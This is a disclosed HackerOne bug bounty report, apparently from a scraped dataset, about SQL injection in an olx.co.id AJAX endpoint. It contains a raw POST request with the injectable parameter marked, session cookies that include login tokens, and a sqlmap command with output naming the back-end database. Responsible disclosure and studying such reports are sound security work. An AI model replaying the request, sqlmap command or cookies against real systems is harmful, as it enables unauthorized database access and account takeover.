---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '446293'
original_report_id: '446293'
title: SQL Injection https://www.olx.co.id
weakness: SQL Injection
team_handle: olx
created_at: '2018-11-17T08:41:32.476Z'
disclosed_at: '2019-06-26T19:53:08.870Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 52
tags:
- hackerone
- sql-injection
---

# SQL Injection https://www.olx.co.id

## Metadata

- HackerOne Report ID: 446293
- Weakness: SQL Injection
- Program: olx
- Disclosed At: 2019-06-26T19:53:08.870Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I found the SQL Injection security hole on the website https://www.olx.co.id, this is a critical finding. here is the POC from the findings that I got

Affectect:https://www.olx.co.id/ajax/buybundle/getbundle/

POC:
Request DATA
POST /ajax/buybundle/getbundle/ HTTP/1.1
Host: www.olx.co.id
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://www.olx.co.id/iklanku/belikuota/
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 38
Connection: close
Cookie: onap=1671bf8b445x484bab7d-2-1672082b96cx6f03d3ab-113-1542444368; _ga=GA1.3.2055550662.1542363904; _gid=GA1.3.1281625644.1542363905; _gcl_au=1.1.1510384817.1542363905; optimizelyEndUserId=oeu1542363905925r0.4566197515732665; optimizelySegments=%7B%22565491018%22%3A%22referral%22%2C%22565580503%22%3A%22ff%22%2C%22573190371%22%3A%22false%22%2C%223984060694%22%3A%22none%22%7D; optimizelyBuckets=%7B%7D; __gads=ID=9f5f3e30f6ec49a9:T=1542363905:S=ALNI_MZRSHXi_59AY5fPKPyzGI2LsoY7uA; PHPSESSID=npgive9f3109sf03c6jvu7q6s6; mobile2=desktop; _fbp=fb.2.1542438707482.1968450559; cto_lwid=957fcfb9-3c83-48c8-b713-3c578afdcc9c; G_ENABLED_IDPS=google; user_id=1; remember_login=92817836%3B79fd70734ae0061075af1463ff810373; observed5_view=list; last_paidads_provider_=payment_chk_0; _gat=1; _dc_gtm_UA-5908313-1=1; AWSELB=5BAF4995185E44C89D2195E4E8346CEE56208525ABB6F0E4043E358110942025440993DB32EF855A72733ADF1543A7B8EC357E95F1817EADB690F9D8982717026EA0432E8E

category={code sql injction}&subcategory=198&location=0

I tried finding SQL injection using SQLmap, I attached it to my report

Payload sqlmap: sqlmap.py -r olx.txt --current-db
back-end DBMS is MySQL
web application technology: Apache
back-end DBMS: MySQL 5 (MariaDB fork)
current database: olxid

## Impact

A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.
Reference:https://www.owasp.org/index.php/Top_10-2017_A1-Injection


Regards

Wyethman Piter (CodesSlayer137)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
